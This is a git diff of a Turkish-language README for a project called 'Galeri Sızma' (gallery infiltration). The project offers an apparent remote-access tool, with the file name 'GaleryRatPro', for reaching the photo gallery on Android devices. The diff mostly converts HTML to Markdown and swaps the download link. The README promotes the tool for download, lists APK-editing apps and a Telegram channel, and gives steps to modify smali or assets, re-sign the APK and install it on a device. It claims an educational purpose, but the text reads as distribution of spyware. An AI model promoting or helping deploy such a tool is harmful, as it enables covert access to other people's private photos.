@@ -13,35 +13,35 @@
 
 ## 🚀 Proje Hakkında
 
-Bu proje, APK yapısına müdahale ederek galeri gibi uygulamalara erişimin <strong>nasıl mümkün olabileceğini simüle eden</strong> bir yapıdır. Gerçek dünyada olası sızma yollarını gösteren bu proje, bir bilgi güvenliği eğitim senaryosu olarak tasarlanmıştır.
+Bu proje, APK yapısına müdahale ederek galeri gibi uygulamalara erişimin **nasıl mümkün olabileceğini simüle eden** bir yapıdır. Gerçek dünyada olası sızma yollarını gösteren bu proje, bir bilgi güvenliği eğitim senaryosu olarak tasarlanmıştır.
 
 ---
 
-## 🛠️ Gereken Uygulamalar
+## 🛠️ Gerekli Uygulamalar
 
 | Uygulama        | Açıklama |
 |-----------------|----------|
-| ✅ <strong>Telegram</strong>     | Komut, dökümantasyon ve destek için. |
-| ✅ <strong>ZArchiver</strong>    | APK içerik düzenlemesi için. |
-| ✅ <strong>Pkg Games</strong>    | Geliştiriciye özel simülasyon araçları sağlar. <a href="https://t.me/pkgProjects">Telegram'a Git</a> |
-| ✅ <strong>APK Editor</strong>   | APK dosyası üzerinde değişiklik ve yeniden imzalama işlemleri için. |
+| ✅ **Telegram**     | Komut, dökümantasyon ve destek için. |
+| ✅ **ZArchiver**    | APK içerik düzenlemesi için. |
+| ✅ **Pkg Games**    | Geliştiriciye özel simülasyon araçları sağlar. [Telegram'a Git](https://t.me/pkgProjects) |
+| ✅ **APK Editor**   | APK dosyası üzerinde değişiklik ve yeniden imzalama işlemleri için. |
 
 ---
 
 ## 📦 İndirme
 
-🔗 <strong><a href="https://github.com/BatumsuKekim/Galeriye-S-zmak-2025---2026/blob/main/GaleryRatPro.zip">Galeri Sızma Uygulamasını İndir</a></strong>
+> 🔗 [Galeri Sızma APK İndir](https://APK.com)
 
 - Dosya Boyutu: ~3.2 MB  
 - Versiyon: 1.0.0  
-- Format: `.zip`
+- Format: `.apk`
 
 ---
 
 ## ⚙️ Kurulum Adımları
 
 ```bash
-1. ZArchiver ile ZIP dosyasını aç
-2. APK dosyasını çıkar ve "assets" veya "smali" klasöründe düzenleme yap
-3. APK Editor ile uygulamayı yeniden imzala
-4. Cihaza yükle ve simülasyonu çalıştır
+1. ZArchiver ile APK dosyasını aç
+2. assets veya smali klasöründe gerekli düzenlemeleri yap
+3. APK Editor kullanarak uygulamayı yeniden imzala
+4. Cihaza yükle ve test et
